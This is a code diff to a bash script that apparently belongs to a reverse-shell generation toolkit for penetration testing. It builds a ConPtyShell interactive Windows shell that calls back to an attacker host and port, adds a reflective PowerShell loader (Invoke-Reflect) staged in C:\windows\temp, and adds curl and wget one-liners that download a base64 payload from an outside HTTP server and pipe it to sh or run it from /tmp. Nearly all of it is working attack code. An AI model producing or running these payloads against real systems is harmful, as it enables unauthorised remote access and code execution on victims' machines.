@@ -305,36 +305,33 @@ get_powershell_interactive_shell() {
 
 }
 
+# special, do not do cmd=$(get_powershell_interactive_shell)
+# because this function outputs too much unnecessary text
+# use the cmd that is set after running this function instead
 get_powershell_interactive_shell_compiled() {
     prepare_generic_windows_shell
-    cp $SCRIPTDIR/../cs/ConPtyShell.cs .
+    cp -rf $SCRIPTDIR/../cs/ConPtyShell .
     stty_size=$(stty size)
     stty_rows=$(echo "$stty_size" | awk '{print $1}')
     stty_cols=$(echo "$stty_size" | awk '{print $2}')
-    sed -E -i 's/\{host_ip\}/'"$host_ip"'/g' ConPtyShell.cs
-    sed -E -i 's/\{host_port\}/'"$host_port"'/g' ConPtyShell.cs
-    sed -E -i 's/\{stty_rows\}/'"$stty_rows"'/g' ConPtyShell.cs
-    sed -E -i 's/\{stty_cols\}/'"$stty_cols"'/g' ConPtyShell.cs
+    sed -E -i 's/\{host_ip\}/'"$host_ip"'/g' ConPtyShell/ConPtyShell.cs
+    sed -E -i 's/\{host_port\}/'"$host_port"'/g' ConPtyShell/ConPtyShell.cs
+    sed -E -i 's/\{stty_rows\}/'"$stty_rows"'/g' ConPtyShell/ConPtyShell.cs
+    sed -E -i 's/\{stty_cols\}/'"$stty_cols"'/g' ConPtyShell/ConPtyShell.cs
     if [[ -z $dotnet_command ]]; then
         dotnet_command="csc"
-        project_file="ConPtyShell.cs"
-    elif [[ "$dotnet_command" == "build" ]]; then
-        project_file="ConPtyShell"
-        mkdir -p $project_file
-        cp $SCRIPTDIR/../cs/ConPtyShell.csproj $project_file/
-        mv ConPtyShell.cs $project_file/
     fi
-    build_dotnet
+    build_dotnet "ConPtyShell"
     unzip -qq -o build.zip 
     cp build/$output_file .
-    generate_windows_download "$output_file" "C:\\windows\\temp\\$output_file"
+    cmd=$(generate_windows_download "$output_file" "C:\\windows\\temp\\$output_file")
     stty_size=$(stty size)
-    echo "C:\\windows\\temp\\$output_file $host_ip $host_port $stty_rows $stty_cols"
+    cmd+="C:\\windows\\temp\\$output_file $host_ip $host_port $stty_rows $stty_cols"
 }
 
 get_powershell_interactive_shell_reflected() {
     dotnet_command="build"
-    get_powershell_interactive_shell_compiled #>> $trail_log
+    get_powershell_interactive_shell_compiled
     if [ -z $output_file ]; then
         echo "Output file not found after compilation."
         return 1
@@ -354,10 +351,10 @@ get_powershell_interactive_shell_reflected() {
     sed -i -E "s/\{PAYLOAD_BIN\}/$output_file/g" Reflect.ps1
     sed -i -E "s/\{PAYLOAD_CLASS\}/ConPtyShellMainClass/g" Reflect.ps1
     sed -i -E "s/\{PAYLOAD_METHOD\}/ConPtyShellMain/g" Reflect.ps1
-    generate_windows_download "Reflect.ps1" "C:\\windows\\temp\\Reflect.ps1"
-    echo "cd C:\\windows\\temp;"
-    echo ". .\Reflect.ps1;"
-    echo "Invoke-Reflect $host_ip $host_port $stty_rows $stty_cols"
+    cmd=$(generate_windows_download "Reflect.ps1" "C:\\windows\\temp\\Reflect.ps1")
+    cmd+="cd C:\\windows\\temp;"
+    cmd+=". .\\Reflect.ps1;"
+    cmd+="Invoke-Reflect $host_ip $host_port $stty_rows $stty_cols;"
 
 }
 
@@ -402,7 +399,19 @@ get_twostage_reverse_shell() {
     echo '#!/bin/bash' > reverse_shell.sh
     echo "$cmd" >> reverse_shell.sh
     base64 -w0 reverse_shell.sh > "$shell_name"
-    echo "curl http://$http_ip:$http_port/$shell_name | base64 -d | sh"
+    if [[ ! -z $two_stage_option ]] && [[ "$two_stage_option" == "wget" ]]; then
+        echo "wget -qO- http://$http_ip:$http_port/$shell_name | base64 -d | sh"
+        return 0
+    elif [[ ! -z $two_stage_option ]] && [[ "$two_stage_option" == "wget_runscript" ]]; then
+        echo "wget http://$http_ip:$http_port/$shell_name -O /tmp/$shell_name"
+        echo "base64 -d /tmp/$shell_name > /tmp/$shell_name.sh"
+        echo "chmod +x /tmp/$shell_name.sh"
+        echo "/tmp/$shell_name.sh"
+        return 0    
+    else
+        echo "curl http://$http_ip:$http_port/$shell_name | base64 -d | sh"
+    fi
+    
 }
 
 get_nc_reverse_shell_powershell() {
